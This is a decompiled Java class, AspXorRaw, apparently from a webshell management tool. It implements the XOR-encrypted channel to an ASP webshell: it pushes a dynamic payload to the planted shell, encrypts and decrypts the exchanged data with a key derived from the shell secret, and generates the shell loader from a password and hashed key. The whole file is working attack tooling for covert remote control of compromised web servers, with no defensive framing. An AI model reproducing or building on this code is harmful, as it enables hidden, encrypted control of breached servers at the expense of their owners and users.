/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.cryptions.aspXor;

import core.annotation.CryptionAnnotation;
import core.shell.ShellEntity;
import shells.cryptions.aspXor.AspXorBae64;
import shells.cryptions.aspXor.Generate;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(Name="ASP_XOR_RAW", payloadName="AspDynamicPayload")
public class AspXorRaw
extends AspXorBae64 {
    private ShellEntity shell;
    private Http http;
    private byte[] key;
    private boolean state;
    private byte[] payload;

    @Override
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX().getBytes();
        this.shell.getHeaders().put("Content-Type", "application/octet-stream");
        try {
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }
        } catch (Exception e) {
            Log.error(e);
            return;
        }
    }

    @Override
    public byte[] encode(byte[] data) {
        try {
            super.decryption(data, this.key);
            return data;
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override
    public byte[] decode(byte[] data) {
        if (data != null && data.length > 0) {
            try {
                super.decryption(data, this.key);
                return data;
            } catch (Exception e) {
                Log.error(e);
                return null;
            }
        }
        return data;
    }

    @Override
    public boolean isSendRLData() {
        return false;
    }

    @Override
    public boolean check() {
        return this.state;
    }

    @Override
    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), this.getClass().getSimpleName());
    }
}

